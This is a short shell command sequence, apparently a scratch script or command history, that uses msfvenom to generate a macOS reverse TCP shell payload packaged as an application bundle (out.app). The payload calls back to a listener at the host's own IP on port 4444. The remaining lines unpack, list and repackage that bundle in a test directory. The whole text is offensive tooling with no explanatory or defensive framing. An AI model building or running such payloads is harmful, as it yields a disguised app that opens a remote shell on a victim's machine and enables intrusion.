PAGER=cat git diff
msfvenom -p osx/x86/shell_reverse_tcp LHOST=$(getip) LPORT=4444 -f osx-app -o out.app
unzip -Z -l out.app
chmod -R 777 testy
rm -rf testy
mkdir testy
cd testy
unzip -q ../out.app
zip -q -r out.app *
unzip -Z -l out.app
cd -

